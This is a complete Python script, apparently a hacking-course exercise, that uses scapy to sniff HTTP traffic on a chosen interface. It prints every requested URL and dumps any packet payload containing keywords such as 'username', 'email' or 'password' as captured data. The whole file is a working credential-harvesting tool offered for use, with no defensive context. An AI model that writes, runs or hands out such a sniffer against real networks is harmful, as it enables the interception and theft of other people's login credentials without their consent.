import sys
import scapy.all as scapy
from scapy.layers import http
import argparse as ap

def sniff(interface):
    scapy.sniff(iface = interface, store = False ,prn = sniffed_packet)
    '''
    store = WHETHER OR NOT TO STORE PACKETS IN MEMORY
    prn = USED TO SENT SNIFFED PACKETS TO A FUNCTION
    '''

def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        '''
        CHECK IF THE SITE HAS HTTP REQUESTS
        '''
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        url =str(url)
        print(f"HTTP REQUESTS >> {url}")
        if packet.haslayer(scapy.Raw):
            '''
            CHECK IF USER ENTERED USERNAME AND PASSWORD
            '''
            load = packet[scapy.Raw].load
            load = load.decode()        #.decode CONVERT BYTE TO STRING
            keywords = ["username","login","user","email","password","pass"]
            for keyword in keywords:
                if keyword in load:
                    print(f"\n\nCAPTURED DATA >> {load} \n\n")
                    break


def arguments():
    parser = ap.ArgumentParser()
    parser.add_argument("-i","--interface", dest = "interface", help=" Enter the Interface")
    options = parser.parse_args()
    interface = options.interface
    if not interface:
        sys.exit("[-]INVALID INTERFACE\n[-]TRY --help FOR MORE INFO")
    return interface


interface = arguments()
sniff(interface)









